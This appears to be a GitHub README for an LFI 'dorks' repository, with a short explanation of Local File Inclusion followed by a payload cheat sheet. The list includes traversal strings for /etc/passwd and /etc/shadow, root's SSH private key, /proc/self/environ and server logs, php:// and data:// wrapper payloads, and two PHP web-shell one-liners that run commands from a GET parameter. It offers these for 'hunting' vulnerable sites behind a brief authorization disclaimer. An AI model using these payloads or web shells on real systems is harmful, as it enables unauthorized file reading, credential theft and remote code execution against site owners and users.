# Local File Inclusion (LFI) Dorks Repository

![Local File Inclusion](https://img.shields.io/badge/Local%20File%20Inclusion-blue)

Welcome to the Local File Inclusion (LFI) Dorks repository! This repository holds a collection of LFI dorks and an explanation of what LFI is, along with examples of LFI dorks and techniques.

## Table of Contents
- [What is Local File Inclusion (LFI)?](#what-is-local-file-inclusion-lfi)
- [Examples of Local File Inclusion (LFI) Dorks](#examples-of-local-file-inclusion-lfi-dorks)
- [Understanding LFI](#understanding-lfi)
- [Advanced LFI Concepts](#advanced-lfi-concepts)
- [Exploring the GDorks Main Repository](#exploring-the-gdorks-main-repository)
- [Local File Inclusion (LFI) Payloads](#local-file-inclusion-payloads)
- [How to Use This Repository](#how-to-use-this-repository)
- [Contributing](#contributing)


## What is Local File Inclusion (LFI)?

Local File Inclusion (LFI) is a vulnerability allowing an attacker to include files on a server through the web browser. Exploiting this vulnerability can lead to reading sensitive information, executing arbitrary code, or even obtaining full control over a system.

## Examples of Local File Inclusion (LFI) Dorks

Here are examples of Local File Inclusion (LFI) dorks that can be used to test for or identify websites vulnerable to LFI attacks:

1. **Basic LFI Dork:** Identifies websites potentially vulnerable to LFI.

   ```
   http://example.com/page.php?file=filename.php
   ```

2. **Traversing Directories:** Testing for LFI by trying to traverse directories.

   ```
   http://example.com/?page=../../../../../../etc/passwd
   ```

3. **Null Byte Injection:** Checking for LFI using null bytes.

   ```
   http://example.com/page.php?file=filename.php%00
   ```

## Understanding LFI

Understanding LFI vulnerabilities is crucial. Exploiting an LFI can allow an attacker to read sensitive files, execute arbitrary code, and potentially gain unauthorized access to the system.

## Advanced LFI Concepts

Advanced LFI involves bypassing filters, manipulating input parameters, and escalating access. Techniques include using wrapper protocols (such as data://, php://, and file://), directory traversal attacks, and exploiting different web server configurations.

## Local File Inclusion Payloads

Here are various payloads useful for testing LFI vulnerabilities in web applications:

1. **Basic LFI Payload:**

   ```
   ../../../../../../etc/passwd
   ```

2. **URL Encoding Payload:**

   ```
   ..%2f..%2f..%2fetc%2fpasswd
   ```

3. **Null Byte Payload:**

   ```
   ../../../../../../etc/passwd%00
   ```

4. **Wrapper Protocol Payloads:**

   - `php://filter/convert.base64-encode/resource=index.php`
   - `data://text/plain;base64,SGVsbG8gV29ybGQ=`

5. **Directory Traversal Payloads:**

   - Windows: `../../../windows/win.ini`
   - Linux: `../../../etc/passwd`
   
6. **Shell Command Execution Payloads:**

   - `<?php echo shell_exec($_GET['cmd']); ?>`
   - `<?php system($_GET['cmd']); ?>`

7. **Server Log File Payloads:**

   - `/var/log/apache/access.log`
   - `/var/log/nginx/access.log`

8. **Windows File Payloads:**

   - `C:\boot.ini`
   - `C:\Windows\System32\drivers\etc\hosts`

9. **PHP Configuration Payload:**

   ```
   /proc/self/environ
   ```

10. **Web Server Configuration Payloads:**

    - Apache: `/etc/httpd/conf/httpd.conf`
    - Nginx: `/etc/nginx/nginx.conf`

11. **Sensitive File Payloads:**

    - `../../../root/.ssh/id_rsa`
    - `/etc/shadow`
   
These payloads are meant for educational and testing purposes only. Always ensure you have proper authorization and permissions before using them on systems.



## Exploring the GDorks Main Repository

The [GDorks repository](https://github.com/Ishanoshada/GDorks/) is a comprehensive resource that contains an extensive collection of LFI dorks, categorized folders, and detailed documentation covering various LFI attack vectors, methods, and tools.

## How to Use This Repository

This repository is organized into folders, each containing specific LFI dorks and related information. Users can explore these folders to discover LFI dorks of interest.

To contribute to this repository, follow the steps outlined in the [Contributing](#contributing) section.

## Contributing

Contributions to this repository are encouraged! If you have additional LFI dorks, examples, or documentation to share, follow these steps:

1. Fork the repository.
2. Create a new branch with a descriptive name.
3. Add your LFI dorks or other content.
4. Submit a pull request.

Your contributions will help make this repository more comprehensive and informative for the community.

Happy hunting for LFI vulnerabilities, and remember to act responsibly and ethically when testing security vulnerabilities.
